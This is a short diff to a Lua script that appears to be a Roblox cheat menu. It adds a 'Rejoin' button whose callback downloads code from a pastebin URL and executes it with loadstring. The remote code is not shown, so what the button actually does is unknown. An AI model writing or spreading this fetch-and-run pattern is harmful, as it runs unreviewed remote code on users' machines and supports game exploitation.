@@ -72,6 +72,14 @@ local Slider = Tabs.LocalPlayer:AddSlider("Slider",
     end
 })
 
+    Tabs.LocalPlayer:AddButton({
+    Title = "Rejoin",
+    Description = "Leaves and rejoins the current game you are in",
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/PHAPvvxU'))()
+    end
+})
+
 -- UNIVERSAL
 
 
